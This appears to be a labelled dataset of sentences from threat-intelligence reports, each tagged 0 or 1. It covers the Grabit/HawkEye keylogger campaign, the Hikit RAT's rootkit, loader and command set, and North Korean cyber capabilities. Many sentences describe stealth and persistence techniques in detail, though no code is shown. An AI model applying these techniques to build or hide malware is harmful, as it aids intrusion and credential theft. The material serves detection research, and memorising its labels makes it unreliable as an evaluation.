Every sample we found was different in size and activity from the others but the internal name and other identifiers were disturbingly similar .	0
The timestamp seems valid and close to the documented infection timeline .	0
Our documentation points to a campaign that started somewhere in late February 2015 and ended in mid- March .	0
As the development phase supposedly ended , malware started spreading from India , the United States and Israel to other countries around the globe .	0
All of the dozens of samples we managed to collect were programmed in Windows machine 32bit processor , over the Microsoft .NET Framework ( Visual Basic / C # ) .	0
Files were compiled over the course of three days , between March 7th and 9th of 2015 .	0
The following chart illustrates how the group or individual created the samples , the size of each sample , the time of the day when each was compiled and the time lapses between each compilation .	0
The smallest sample ( 0.52Mb ) and the largest ( 1.57Mb ) were both created on the same day , which could indicate experiments made by the group to test features , packers and " dead code " implementations .	0
Looking at the chart , it is interesting to see the modus operandi as the threat actor consistently strives to achieve a variety of samples , different code sizes and supposedly more complicated obfuscation .	0
Along with these different sizes , activities and obfuscation , a serious encryption algorithm was also implemented in each one of them .	0
The proprietary obfuscated string , methods and classes made it rather challenging to analyze .	0
ASLR is also enabled , which might point to an open source RAT or even a commercial framework that packed the malicious software in a well written structure .	0
This type of work is known as a mitigation factor for threat actors to keep their code hidden from analysts ' eyes .	0
During our research , dynamic analysis showed that the malicious software 's " call home " functionality communicates over obvious channels and does not go the extra mile to hide its activity .	0
In addition , the files themselves were not programmed to make any kind of registry maneuvers that would hide them from Windows Explorer .	0
Taking that into an equation , it seems that the threat actors are sending a " weak knight in a heavy armor " to war .	0
It means that whoever programmed the malware did not write all the code from scratch .	0
A well trained knight would never go to war with a blazing shield and yet a stick for a sword .	0
Looking into the " call home " traffic , the Keylogger functionality prepares files that act as a container for keyboard interrupts , collecting hostnames , application names , usernames and passwords .	0
However , the interesting part lies here .	0
The file names contain a very informative string .	0
HawkEye_Keylogger_Execution_Confirmed_<VICTIM > 3.10.2015 6:08:31 PM HawkEye is a commercial tool that has been in development for a few years now ; it appeared in 2014 , as a website called HawkEyeProducts , and made a very famous contribution to the hacker community .	0
In the website , the product shows great versatility as it contains many types of RATs , features and functionality , such as the traditional HawkEye Logger or other types of remote administration tools like Cyborg Logger , CyberGate , DarkComet , NanoCore and more .	0
It seems to support three types of delivery : FTP , SMTP and Web - Panel .	0
As seen , the malware uses a number of RATs to control its victims or track their activity .	1
One of the threat actor 's successful implementations contained the well - known DarkComet .	0
This convenient " choose your RAT " functionality plays a very important role in the malware infection , routine and survival on the victim 's machine .	0
The DarkComet samples are more complicated than the traditional HawkEye logger .	0
One instance had a random key generator which sets an initialization vector of the first 4 bytes of the executable file and appends a random 5 byte key that unpacks another PE file , less than 20Kb in size .	0
The PE file then contains another packer with an even more challenging obfuscation technique .	0
The last sample we tested had still more complicated behavior .	0
The code itself had the same obfuscation technique , though traffic was not transferring in clear text .	0
Stolen data was packed and sent encrypted over HTTP random ports .	1
This means that the group is trying to produce other types of malicious samples with different RATs .	0
Approximately 10,000 stolen files have been collected .	0
Companies based in Thailand and India had the largest percentage of infected machines .	0
By looking at the stolen credentials , it is very clear that employees sent the malware to one another , as stolen host names and internal applications are the same .	0
The following is the full chart , updated to May 2015 .	0
Malware distribution by country Demonstrating the effectiveness of their simple Keyloggers , one C2 ( on May 15th ) maintained thousands of victim account credentials from hundreds of infected systems .	0
To sum it up , Grabit threat actors did not use any sophisticated evasions or maneuvers in their dynamic activity .	0
It is interesting to see the major differences between the core development of the malware and the actual functionality it uses .	0
Some malware samples used the same hosting server , and even the same credentials .	0
Could it be that our threat actor was in a hurry ? Our guess is that we are looking at a group and not an individual .	0
Some members of the group are more technical than the others and some are more security oriented and aware of the risks they might expose themselves to .	0
Back to square one .	0
From what we have seen so far , the malware is being delivered as a Microsoft Office Word ( .doc ) email attachment , containing a malicious macro called AutoOpen .	1
This macro simply opens a socket over TCP and sends an HTTP request to a remote server that was hacked by the group to serve as a malware hub , before downloading the malware .	0
In some cases the malicious macro was password protected , but our threat actor might have forgotten that a .doc file is actually an archive and when that archive is opened in a convenient editor of your choice , the macro strings are shown in clear - text .	0
The malware is in plain view , modifying commonplace registry entries , such as the startup configurations , and not covering its tracks .	1
Its binaries are not deleted in most cases , and its communication is in clear- text , where the victim can sniff the communication and grab the FTP / SMTP server 's credentials .	0
Malware derivatives are mainly located in .	0
C:\Users\ < user > \AppData\Roaming\Microsoft Phishing extensions : .doc 3f77403a64a2dde60c4962a6752de601d56a621a 4E7765F3BF73AEC6E350F412B623C23D37964DFC Icons : .pdf , .doc , .ttf , .xls , .ppt , .msg , .exe Stealer : .txt , .jpeg , .eml Additional Executable names .	0
Malware extensions : .zip or .exe IP Addresses .	0
Hikit consists of at least two generations of malware that provides basic RAT functionality .	1
The first generation of Hikit ( referred to as '' Gen 1 '' ) operates as a server and requires an externally exposed network interface in order for an attacker to access the victim machine .	1
The second generation of Hikit ( referred to as '' Gen 2 '' ) uses the more traditional client model and beacons out to an attacker 's C2 server .	1
While the communication models shifted dramatically between Gen 1 and Gen 2 , both generations of Hikit retain the same basic RAT function consisting of remote command shell , file management , network proxy and port forwarding .	1
Both Gen 1 and Gen 2 sub-families of Hikit consist of a main DLL ( referred to as '' the DLL '' ) that contains the RAT functionality ; a kernel driver ( referred to as '' the Driver '' ) with Gen 2 also employs an additional component : a loader executable .	1
The driver component of Gen 1 and Gen 2 are drastically different in their operation and intent .	0
For the Gen 1 sub-family of Hikit , the driver acts as a NDIS ( network ) driver that is responsible for interfacing the DLL to the network while preventing a direct WinSock interface from occurring .	0
The Gen 1 Driver listens to network traffic arriving at the local network interface and waits for a specific trigger string .	1
The trigger string varies by Driver and DLL sample .	0
The Gen 2 Driver is a simpler system driver that acts as a rootkit to hide processes , registry keys and network connections associated with Gen 2 activity on the victim 's system .	1
Gen 2 uses a standard client-server malware model meaning that the malware no longer requires a direct Internet-facing network card , no longer uses a network driver for networking , and provides the ability to network multiple Gen 2 samples behind a firewall with greater ease ( from the attacker's perspective ) .	0
The Gen 2 sub-family , however , no longer employs network stealth provided by the Gen 1 network driver which exposes the C2 server addresses to analysts .	0
Each of the Hikit generations contains multiple sub-generations as the author ( s ) of Hikit have evolved their code over time .	0
There is a noticeable steep improvement over the code base of Gen 1 Hikit family during its 2011 development period .	0
The Gen 2 sub-generations share a similar improvement scale between late 2011 and late 2013 .	0
The earliest known Hikit sample dates back to 31 March 2011 .	0
Known as the Gen 1.0 sub-generation of Hikit Gen 1 , the first known sample of Hikit deviated from the later traditional Gen 1 model .	0
The Gen 1.0 sample was a standalone executable whereas subsequent Gen 1 sub-generations use a DLL running as a service .	0
The Gen 1.0 sample is clearly a work-in-progress .	0
The Gen 1.0 sample , while different than subsequent sub-generations , does still rely on the Driver component and for the most part the structure of the code does not differ much going forward into the Gen 1 evolution .	0
Less than three weeks after Gen 1.0 , the author ( s ) of Hikit move into Gen 1.1 .	0
The notable change is that the Hikit model of using a DLL and driver , which has remained until present day , comes into being .	0
The code matures slightly between Gen 1.0 and Gen 1.1 but the functionality does not change .	0
Both Gen 1.0 and Gen 1.1 use plaintext data transmissions .	0
Development appears to halt on Gen 1 for 4 months between 20 June 2011 and 23 October 2011 based on a lack of available samples found .	0
During this time the development of Hikit appears to change locations .	0
Gen 1 samples have Program Database ( PDB ) file strings that identify the file path of the Hikit source code .	0
For Gen 1.0 and Gen 1.1 samples , the file path of the Hikit source code is consistently h : \JmVodServer\hikit .	0
Starting with Gen 1.2 , the file path switches to e : \SourceCode\hikitnew .	0
It is at this time that the functionality of Hikit Gen 1 begins to mature .	0
In Gen 1.2 , the communication between the infected machine and the attacker is encrypted using an XOR mask .	1
A more subtle change is the renaming of the '' socks5 '' command to simply '' proxy '' within the code .	0
The code within Hikit begins to mature but the overall functionality does not expand beyond the original set of commands found in Gen 1.0 .	0
The other remarkable change within the Gen 1.1 to Gen 1.2 development is the way in which the session handshake trigger operates .	0
In Gen 1.0 and Gen 1.1 , the DLL instructs the Driver to listen for a specific string ( typically a HTTP request string ) and responds with another string .	0
In Gen 1.2 , the Driver has a hardcoded trigger string ( a specific HTTP request string ) and the DLL instructs the Driver to inspect a specific HTTP header field for a specific hexadecimal value .	0
This moves Gen 1.2 into more of a username/password authentication scheme whereas previous sub-generations could potentially be accessed by accidental HTTP requests .	0
At the same time , the Driver responds with a specific value with in the Etag HTTP header field .	0
This places Gen 1.2 into a more stealth position as a random , non-HTTP compliant response from Gen 1.0 and Gen 1.1 samples is more obvious than a legitimate HTTP response with a specially crafted Etag header .	0
Gen 1.2 's development cycle appears to exist between 23 October 2011 and 2 November 2011 with several new samples being found on the Internet having legitimate compile times during this time window .	0
There is , however , evidence that the development of Hikit Gen 1 and Gen 2 overlap by several months .	0
The earliest Gen 2 sample known to exist dates to 28 August 2011 , two months before the first known Gen 1.2 sample .	0
The last known Gen 1.2 sample , and by extension , the last known Gen 1 sample , dates to 9 April 2012 .	0
The first known Gen 2 sub-generation , Gen 2.0 Alpha , much like Gen 1.0 , represents an early development version of the Gen 2 Hikit sub-family .	0
Gen 2.0 Alpha is a stand-alone Windows console executable that can run as a service executable .	0
Gen 2.0 Alpha supports the same commands as Gen 1.2 with an additional command that returns the infection 's configuration information .	0
On 9 February 2012 the first known sample for Gen 2.0 Beta is compiled by the developer ( s ) of Hikit .	0
Also a stand-alone console executable like Gen 2.0 Alpha , the Gen 2.0 Beta code changes internally without providing significant functionality improvements with the exception of now the executable uses a device driver to hide network , file , and registry artifacts related to its operation .	0
Both Gen 2.0 Alpha and Gen 2.0 Beta still retain PDB file path information within their binaries .	0
During the development phase of Gen 2.0 Alpha , development of the Gen 2.0 Alpha variants changes locations .	0
First version of the Gen 2.0 Alpha malware , from 28 August 2011 , has the PDB path located in H : \JmVodServer\Matrixnew2 whereas the file path for later Gen 2.0 Alpha and Gen 2.0 Beta binaries has the PDB path in E : \SourceCode\Matrixnew which suggests that the source code for both Gen 1 and Gen 2 existed on the same machine and moved at roughly the same time .	0
This may indicate either a single developer or a team ( or set of teams ) with shared resources .	0
The first known Gen 2.1 binary has a compile date of 17 April 2012 .	0
Gen 2.1 represents the first Gen 2 sub-generation to use an executable-based loader , DLL and driver model , a model that all subsequent Gen 2 sub-generations employ .	0
The functionality of the Gen 2.1 sub-generation is the same as the previous generations with no new commands being introduced .	0
Gen 2.1 is the first sub-generation in the Gen 2 sub-family to introduce 64-bit binaries .	0
The Gen 2.2 sub-generation appears to have begun on 20 July 2012 .	0
Gen 2.2 is notable for altering where the configuration information of the RAT is stored and using both DLL-based and executable- based loaders .	0
Also notable is the fact that the sub-generation spans a significant amount of time with intermittent periods of development .	0
The bulk of the Gen 2.2 samples that have the tell-tale marks of being the product of a builder have a compile date of 26 July 2013 , a full year after the first known Gen 2.2 sample .	0
Between 21 July 2012 and 20 February 2013 , there are no known Gen 2.2 binaries .	0
The two 20 July 2012 samples have different compile times indicating they were not the product of a builder but rather unique compilations .	0
Between 21 February 2013 and 27 February 2013 , there are 4 unique compilation dates for the DLL component with 7 unique , known Gen 2.2 DLLs .	0
The bulk of Gen 2.2 samples have a compile date of 26 July 2013 .	0
There are approximately 25 known Gen 2.2 DLLs with the 26 July 2013 compile date .	0
The Gen 2.2 sub-generation appears to exist through at least 19 September 2013 .	0
The last known Gen 2 sub-generation , Gen 2.3 , began on 12 December 2013 .	0
Gen 2.3 is notable for its use of a legitimate SSL certificate as part of the handshake between the infected machine and the attacker 's C2 .	0
The DLL will send a legitimate SSL certificate as a means to disrupt heuristic IDS sensors that look for encrypted traffic .	1
Another interesting aspect of the Gen 2.3 sub-generation is that there is no longer a marker to designate the beginning of the embedded configuration .	0
Gen 2.1 and Gen 2.2 uses a specific string to indicate the beginning of the embedded configuration presumably in order to allow the builder to locate the configuration space when constructing a new configuration for the binaries .	0
Gen 2.3 , however , uses a specific location instead , requiring the builder to calculate the specific location using the PE/COFF header of the binary .	0
Also , while Gen 2.1 and Gen 2.2 retain the configuration within the DLL component , Gen 2.3 stores the configuration within the loader component .	0
This allows the attackers to configure the loader without having to update the DLL .	0
The evolution of Hikit is a long and drawn out series of small , incremental development changes .	0
The important take away from the evolution of Hikit is that the developers for Gen 1 appear to have changed in late 2011 and development of Gen 2 has a several month overlap with the development and usage of Gen 1 .	0
The following table provides a quick reference to the generational ( and sub-generational ) designations of Hikit .	0
The Driver component for Hikit varies based on the specific Hikit sub-family ( Gen 1 or Gen 2 ) .	0
As such it is necessary to describe each in the context of its specific sub-family .	0
The Driver component of Gen 1 Hikit variants provides the interface between the victim 's network interface card ( NIC ) and the DLL .	0
The Driver is a NDIS ( network ) driver that integrates into the victim's network stack .	0
The Driver intercepts any and all network communication that traverses the Windows network stack and potentially removes the data from the network stack under very specific conditions .	1
When the Driver removes data from the network stack , the Driver stores the removed data in local buffers for the Gen 1 DLL to query against .	0
The purpose of this behavior is to allow the DLL to interact with the network without utilizes the WinSock API which could potentially reveal the presence of Hikit .	1
In order to interact with the Driver , the DLL uses the function The Driver will remove data from the network stack only if a new channel is being established .	0
A new channel occurs when the Driver detects a trigger string .	0
The trigger string is typically a short form HTTP request with the following trigger strings found in the wild : Up to and including Gen 1.1 Drivers required the DLL to specify the trigger string in addition to the authentication value whereas Gen 1.2 Drivers had the trigger strings hardcoded .	0
In Gen 1.2 , whenever the Driver detects a trigger string , the Driver inspects the rest of the data received for the authentication value .	0
If the token follows the trigger string ( there is no specific limitation on how far from the trigger string the password token must be ) , then the Driver generates a new channel that the DLL will use as the conduit between the DLL and the client .	0
The Driver appears to be based off the NDIS example source code PassThru .	0
More specifically , the author ( s ) of the Driver appear to have used the modified version of the PassThru example , PassThruEx , by James Antognini and Thomas Devine from a 2003 blog post .	0
The Gen 2 sub-family , beginning with Gen 2.0 Beta , employs a Windows device driver ( '' the Driver '' ) to hide aspects of the DLL 's functionality from normal system processes .	1
The Driver is a relatively straightforward piece of software .	0
It does not attempt to obfuscate its functionality from static analysis and it hooks a minimum number of kernel API functions in order to hide different pieces of information .	1
The Driver is based primarily on the open source Agony rootkit and it has evidence of some portions of the code coming directly from a Chinese blog .	0
The Driver expose an IOCTL interface that supports the following OIDs : The Driver is capable of hiding processes ( by PID , not name ) , system modules , services , network connections , listening ports , directories ( and by extension , files ) , as well as registry keys and values .	1
In order to hide these items , the Driver hooks various Windows Kernel API calls .	1
The following table maps the items the Driver can hide to the API function that the Driver hooks : In order to hide services , the Driver will access the memory of the services.exe process , locate the linked list of services and remove the service entry that the Driver wishes to hide .	1
This is a surprisingly invasive method to obfuscate a process .	1
Upon activation , the Driver will expose its interface by calling IoCreateDevice with the name \Device\agony ( for Gen 2.0 Beta samples ) , \Device\HTTPS ( for Gen 2.1 samples ) , \Device\advcachemgr ( for Gen 2.2 samples ) or \Device\diskdump ( for Gen 2.3 samples ) .	1
The Driver also creates a symbolic link to the device using the same name but under the \DosDevices\ tree .	1
For reasons unknown , the authors of the Driver used code from a Chinese blog that details how to hide network connections on Windows Vista and later decided to keep the example IP address within the code .	0
The Hikit family has supported roughly the same set of commands since the first known samples of Gen 1.0 .	1
Gen 2.0 introduced a single command to provide insight into an infected machine 's Hikit configuration ( something that is not necessary for Gen 1 variants since they are server-based ) .	0
The RAT supports the following commands : The shell command activates a remote shell on the victim 's computer .	1
The remote shell function uses the standard pipe redirection method for interfacing a network application ( in this case , the DLL ) to a hidden command shell .	0
The file command provides an attacker with a variety of disk access options such as listing directories , changing the current directory , and uploading and downloading files .	1
The connect function provides the functionality to allow one Hikit DLL to interface with another DLL of a similar version .	0
The use of this functionality can best be illustrated by considering the fact that the Gen 1 Driver requires an exposed network interface in order for an external attacker to access the Gen 1 's RAT function .	0
This would prohibit lateral movement within a victim 's network as the bulk of any organization 's network infrastructure is not directly exposed to the Internet .	0
By using the connect command , an attacker can instruct the externally exposed Gen 1 DLL to route traffic to a Gen 1 DLL that is behind the firewall , effectively making the externally exposed Gen 1 DLL a local router for Hikit traffic .	0
The proxy ( or socks5 ) command allows an attacker to utilize a Hikit-infected machine as a proxy .	1
Gen 2 samples rely on a configuration in order to know where the C2 server exists along with other operational aspects such as the name of its service and operational times .	1
This information is important for the attacker to have access to in order to determine if any aspect of the configuration is out of date ( thus requiring a new variant of the Gen 2 binary to be configured and deployed ) .	0
The information command returns to the attacker the complete configuration and current state of the Gen 2 malware .	0
As the name implies , the exit command causes the DLL to discontinue the current connection .	0
With the Gen 1 sub-family using a server model and the Gen 2 sub-family using the client model , understanding how each of the DLL components of the sub-families works is best done , as with the Driver above , in the context of the specific sub-family .	0
As noted previously in this report , the Gen 1 sub-family has several sub-generations but overall the functionality of the Gen 1 sub-family has remained constant .	0
With the exception of Gen 1.0 , the functionality of Gen 1 comes from the DLL component ( Gen 1.0 uses a stand-alone executable to achieve the same results ) .	0
The DLL operates as a service , requiring an attacker is install the DLL as a service at some point prior to activation .	1
The DLL contains only two exports : DllEntryPoint and DllRegisterServer .	0
Ultimately , both exports generate a new thread of the same function ( '' mainThread '' ) .	1
The difference between the two exports is that DllRegisterServer can take an optional command line argument of the letter '' u '' which will instruct the main thread to uninstall the Gen 1 system from a victim 's computer .	1
If the uninstall argument exists , mainThread will simply remove the Driver from the victim 's machine and terminate .	1
The authors of Gen 1 used freely available source code found online for their removal function .	0
When the DLL activates , either by a call to DllEntryPoint or by calling DllRegisterServer without the u parameter , mainThread begins by verifying the version of the Driver installed on the victim 's machine .	1
This requires sending OID 0x12C850 to the Driver and comparing the resulting 32-bit value with the required driver version .	0
If the version is incorrect ( i.e .	0
it does n't match the specified version ) , the DLL installs the version of the Driver found within the DLL 's resource section ( under the BIN resource tree ) .	1
With the Driver version verified ( or forcibly corrected by installing the appropriate Driver ) , the DLL will instruct the Driver to use a specified string ( for Gen 1.0 and Gen 1.1 samples ) or a DWORD ( for Gen 1.2 samples ) as the acknowledgment value to send to a connecting client who requests the appropriate URL .	1
The DLL again checks the version of the Driver and , in some versions of the DLL , will print a message indicating the version of the Driver installed and report the '' Transate version '' ( the word translate is misspelled within the binary ) .	0
It appears that the Driver and the communication protocol version do not necessarily have to match exactly , allowing the possibility that the Driver and the DLL could be compiled at separate times .	0
If the Driver version is less than the '' Transate '' version ( indicating that the Driver is a version too old to support the necessary communication protocols ) , the DLL will , in some version of the DLL , print out a line to the screen indicating the DRIVERMINVERSION required along with the current Driver version .	0
Following this , the DLL will then attempt to install the correct version of the Driver prior to terminating .	1
It is unclear why this code exists given that the DLL will check the Driver version and correct the Driver if necessary prior to reaching the portion of the code that reports the DRIVERMINVERSION .	0
It is possible that the second Driver version check is a last ditch effort to ensure the correct Driver is installed .	1
The DLL enters an infinite loop where the DLL waits for the Driver to report a new channel exists .	0
A channel represents an established connection between the Driver and an external party that has provided the proper initial request and , for Gen 1.2 variants , provided the proper authentication value .	0
When the Driver establishes a new channel , the DLL generates a runtime data structure before generating a new thread ( '' HikitThreadFunc '' ) which will service any request coming from the new channel .	1
This allows the DLL to service multiple channels at one time .	0
The HikitThreadFunc function is , at its core , a simple wait and respond loop .	0
The function begins by transmitting a Hikit command prompt to the client ( Hikit > ) before settling into an infinite loop of The communication scheme between the DLL and the client consists of a 20 to 24 byte header ( for Gen 1.0 and Gen 1.1 ) or a 28 byte header ( for Gen 1.2 ) followed by an optional payload .	0
The format of the Gen 1.0 and Gen 1.1 header is as follows : While the Gen 1.2 header is : For Gen 1.0 and Gen 1.1 samples , the magic field contains the string '' ..	0
..	0
'' ( two dots followed by a space then two more dots ) .	0
Whereas the key field in Gen 1.2 samples contains a 32-bit value that represents the XOR key for the remainder of the PacketHeader and any additional payload data .	0
The XOR scheme works on 32-bit chunks of data where each 32-bit chunk of data is XOR 'd against the key value .	0
Version checking is important in all Gen 1 variants .	0
The dwHikitVersion field allows the client and the DLL to ensure that they have a compatible communication scheme in place prior to executing commands .	1
Gen 1 samples have a particular interest in the victim 's locale language preferences .	0
While it is typical for most RATs that provide remote shells to simply pass data unfiltered from client to server and server to client without regard to code pages , Gen 1 samples take special care to record the code page and locale information in each and every packet header that traverses the divide between client and server and server and client .	0
This could indicate that the authors of Gen 1 understood from an early stage in the development of Gen 1 that they would be attacking computer systems with different locales and code pages .	0
The Gen 2 sub-family , like Gen 1.2 , uses a DLL for the core of its RAT functionality .	1
In order for the DLL to load , Gen 2 ( starting with Gen 2.1 ) uses a loader application ( referred to simply as '' the Loader '' ) .	1
The Loader comes in the form of a standard executable image or a DLL image .	0
Despite the different models , both variants of the Loader load the embedded DLL in the exact same way .	1
The only difference between the executable and DLL versions of the Loader comes in how they handle the initialization of the embedded DLL .	0
Figure 1 provides a side by side comparison of the startup routines for the executable and DLL Loaders .	0
Both versions of the Loader begin by loading the embedded DLL from the Loader 's resources ( item 102 under the Group Icons resource tree ) , decrypting and decompressing the image into memory , then manually loading the DLL into memory using a custom loading routine .	1
The function LoadEmbeddedImage , as seen in part in Figure 2 , is responsible for this operation .	0
The Loader obfuscates many strings by using a simple XOR encoding scheme .	0
Decryption of encoded strings consists of taking the first value of the string as the XOR key , XOR'ing all subsequent bytes until the result of the XOR returns 0 .	0
The decoding of the encoded strings is handled by the DecodeString function .	0
The Loader stores the embedded DLL within a Group Icon resource within a legitimate icon image .	0
In order to locate the embedded DLL , LoadEmbeddedImage will use the DecodeString function to decrypt the delimiter string ( which is typically zzzzzzzzzz or yyyyyyyyyy ) and then search the icon's resource memory for the delimiter string .	0
Once located , LoadEmbeddedImage will use the first 12 bytes immediately after the string as the information structure about the embedded DLL .	0
The structure ( seen below ) defines the size of the embedded DLL within the icon 's resource memory , the size of the DLL after it is decompressed and a 4-byte XOR key that LoadEmbeddedImage must use to decode the embedded DLL prior to decompression .	0
LoadEmbeddedImage copies the compressed embedded DLL into a newly allocated heap buffer and then calls the function decodeBuffer ( using the EncodingKey value ) to decrypt the embedded DLL .	1
Another heap buffer is allocated with a size equal to the value of dwImageSizeDecompressed .	0
The decompression buffer along with the now decoded compressed buffer are given to lzodecompress which decompresses the compressed image using the LZO1X algorithm .	0
With the embedded DLL now decompressed into a heap buffer , LoadEmbeddedImage calls ImageLoaderData : :LoadDll to manually load the DLL into memory .	1
ImageLoaderData : :LoadDll interprets the PE/COFF header of the DLL image , loads the image into the appropriate memory configuration , performs the necessary relocation operations , and calls the DllMain ( DLL 's entry point ) function .	1
After loading the embedded DLL image into memory , the Loader will either call the DLL's StartServer or MatrixMain function depending on the type of Loader .	1
The standalone Loaders use the MatrixMain function while the DLL Loaders will call the StartServer function .	1
The Loaders , upon unloading , will call the StopServer function in order to shut down the embedded DLL .	1
The Gen 2 DLL exposes five exported functions ( besides the DllEntryPoint/DllMain ) .	0
MatrixMain and StartServer both ultimately generate a new thread ( using the POSIX API function beginthreadex instead of the more common CreateThread ) that contains the main loop of the Gen 2 RAT functionality .	1
MatrixMain , however , has added functionality .	0
The prototype for MatrixMain is as follows : where Arguments parameter can be : If the i parameter is given , the DLL will install itself as a service on the victim 's machine .	1
The DLL will create a new service ( e.g .	1
'' Network DDE Service '' ) and assign itself as the executable for the service .	0
The DLL 's RAT functionality provides basic features such as network port forwarding ( proxying ) , file transfer , and remote command shell .	1
The RAT functionality provides an attacker with the ability to establish a phantom network within a victim 's infrastructure by having individual instances of Gen 2 DLL listen for incoming connections on local ports ( presumably , NAT 'd ports ) and accept commands from the inbound connection .	1
This allows an attacker to establish several Gen2 infections within a victim's infrastructure and if outbound connectivity is prohibited for any of the infected machines , the attacker can route commands to the pseudo-isolated infections through accessible infected machines providing a high level of persistence to the malware .	1
Each Gen 2 infection can support up to 10 listening ports .	1
The communication between the Gen 2 malware and the C2 ( or other Gen 2 malware , in the case of the internal routing functionality ) is encrypted using a simple DWORD XOR scheme .	1
Each communication burst ( either between the malware and the C2 or the malware and neighboring malware ) begins with a 24-byte header identical to the header found in Gen 1.2 .	0
Immediately following the header is the type-specific ( as indicated by the dwPayloadType field ) payload data .	0
Note that the dwXORKey value is NOT encoded with the XOR value , but rather is the value that is used for encoding the header and payload .	0
Each DLL includes a hardcoded , default configuration .	0
At the time that the RAT functionality activates , the DLL will drop the current configuration to disk .	0
If the configuration file already exists , then the RAT will use the file version of the configuration over the default configuration .	0
The configuration data structure ( seen below ) doubles as a current state record for some aspects of the communication subsystem of the DLL .	0
When stored on disk , the configuration is preceded by a GUID value ( 16 bytes ) that represents the unique identifier for the specific infection .	0
The configuration is XOR encoded using the first 4 bytes ( as a DWORD ) of the GUID .	0
In order to provide some level of stealth , the RAT will install a rootkit on 32-bit versions of Windows .	1
The DLL contains a device driver image embedded within an encoded buffer which the RAT functionality code will extract to the % TEMP % directory ( after XOR'ing the buffer with 0x76 ) .	0
To activate the rootkit , the RAT functionality code creates a service with the driver in the % TEMP % directory as the executable for the service .	1
The RAT functionality code then activates the service and opens a handle to device driver 's interface ( e.g .	1
\Globals\HTTPS ) .	0
With the handle open to the rootkit driver , the RAT functionality code deletes the service in order to reduce the visible footprint of the new driver .	1
To further reduce the footprint of the driver , the RAT functionality code also uses the cloaking functionality of the rootkit to hide the DLL 's PID , any references to the GUID { 4AE26357-79A3-466D-A6D9- FC38BFB67DEA } , the DLL 's service names ( e.g . '' NetDDESrv '' and '' Network DDE Service '' ) and the service entry as well .	1
Additionally , the code also attempts to hide a service named '' Hitx '' .	1
In addition to the main Hikit malware , there are at least two examples of support programs that belong to the Hikit family .	0
Samples b04de6c417b6f8836e3f2d8822be2e68f4f9722b and 7c4da9deff3e5c7611b9e1bd67d0e74aa7d2d0f6 are examples of Gen 1.0 and Gen 1.2 operator consoles .	0
The console is a text based application that takes a Gen 1.0 or Gen 1.2 infection 's IP address and proceeds to connect and authenticate with the infected server .	1
Once connected , the operator has the basic Hikit functionalities available to them via commands such as file and shell .	1
Detecting Hikit variants on disk and in memory is possible using the following YARA signature developed by Symantec : Detecting nominal Gen 1.2 and later network activity is problematic given the nature of the communication structure .	0
The encrypted nature of the nominal Gen 1.2 and later network traffic makes a signature difficult .	0
Snort signature 30948 may detect some Hikit based network traffic for only Gen 1.0 and Gen 1.1 .	0
From a system objects perspective , Gen 2 samples produce up to three named events .	1
The event names change per infection , but have a common format .	0
Thank you for subscribing to Episode 16 of the HP Security Briefing .	0
In this edition we discuss the cyber landscape within the Democratic People's Republic of Korea .	0
The Democratic People 's Republic of Korea ( DPRK ) , known in the West as North Korea , is a unique country with a military-focused society and an unconventional technology infrastructure .	0
While North Korea was formerly on the U.S. list of state sponsors of terrorism , it was removed in 2008 .	0
However , due to North Korea 's hostility toward other nations , its pursuit of nuclear weapons , and human rights violations against its own citizens , the United Nations and many Western entities have placed sanctions and embargoes against North Korea .	0
For example , U.S. export laws forbid the sale of dual-use technologies , or those that can be used or repurposed for both civilian and military use , to North Korea .	0
< /n > 5 < /fn > Additionally , the U.S. has a military alliance with the Republic of Korea ( ROK ) , known in the West as South Korea , North Korea 's primary target of conflict .	0
Due to North Korea 's global interactions , its cyber warfare capabilities are of particular interest to the U.S .	0
According to a 2009 report by Major Steve Sin , an intelligence analyst at U.S .	0
Forces Korea , North Korean hackers have successfully penetrated U.S. defense networks more frequently than any other country that has targeted U.S. defense assets .	0
While Major Sin may have been overly optimistic about North Korea 's abilities , it is clear that they should not be underestimated .	0
Frank Cilluffo , co-director of the Cyber Center for National and Economic Security at George Washington University , testified before Congress that North Korea 's cyber capability '' poses an important 'wild card ' threat , not only to the United States but also to the region and broader international stability… '' In an April 2014 testimony given to the House Armed Services Committee , General Curtis M. Scaparrotti noted that '' North Korea remains a significant threat to United States ' interests , the security of South Korea , and the international community due to its willingness to use force , its continued development and proliferation of nuclear weapon and long- range ballistic missile programs , and its abuse of its citizens ' human rights , as well as the legitimate interests of its neighbors and the international community .	0
'' Scaparrotti stressed that '' While North Korea 's massive conventional forces have been declining due to aging and lack of resources…North Korea is emphasizing the development of its asymmetric capabilities .	0
North Korea 's asymmetric arsenal includes…an active cyber warfare capability .	0
'' While one would expect the regime 's digital infrastructure to also suffer from aging or lack of resources , these factors do not take away from their technical abilities to wage cyber warfare .	0
While the U.S. views North Korea 's cyber warfare program as the regime 's foray into modern asymmetrical warfare , South Korea views the regime 's cyber capabilities as a terroristic threat , -a build-up for an impending multifaceted attack .	0
It is important to note that , to date , no such attack has occurred .	0
According to a report written by Captain Duk-Ki Kim , Republic of Korea Navy officer and Ph.D. '' …the North Korean regime will first conduct a simultaneous and multifarious cyber offensive on the Republic of Korea 's society and basic infrastructure , government agencies , and major military command centers while at the same time suppressing the ROK government and its domestic allies and supporters with nuclear weapons .	0
'' South Korea 's view of North Korea as a terroristic threat may be an attempt to downgrade North Korea politically , since South Korea does not recognize the regime as a legitimate state .	0
South Korean reports also claim that North Korea 's premier hacking unit , Unit 121 , trails Russia and the U.S. as the world 's third largest cyber unit .	0
While this claim may be exaggerated , in 2012 , South Korean reports estimated North Korea 's hacker forces at around 3000 personnel .	0
In a July 2014 report from South Korea 's Yonhap News Agency , that figure was upgraded to 5900 hacker elite .	0
We must stress that although these claims have not been corroborated , South Korea has taken the regime 's cyber threats very seriously and is reportedly training 5000 personnel to defend against North Korean cyber attacks .	0
Obtaining details on North Korea 's cyber warfare capabilities is not an easy task .	0
This paper will examine the known cyber capabilities of North Korea 's regime and how the country maintains secrecy in these matters .	0
Through information obtained via open source intelligence ( OSINT ) , we will present what is known about North Korea 's cyber warfare and supporting intelligence and psychological operations capabilities .	0
The following conditions proved to be research roadblocks when gathering intelligence regarding North Korea 's cyber warfare capabilities :  Much of the intelligence available on North Korea is dated and may not accurately reflect the regime 's current capabilities .	0
 Much of the intelligence available on North Korea comes from U.S. or South Korean military or agency reports .	0
These reports omit details that are likely classified , such as specific IP addresses and individual actor information .	0
 While South Korea is an ally of the United States , its reports on North Korean cyber activity potentially contain incomplete or biased information .	0
Cultural factors that stem from a history of tension and conflict between the two nations may skew perception and make objectivity difficult .	0
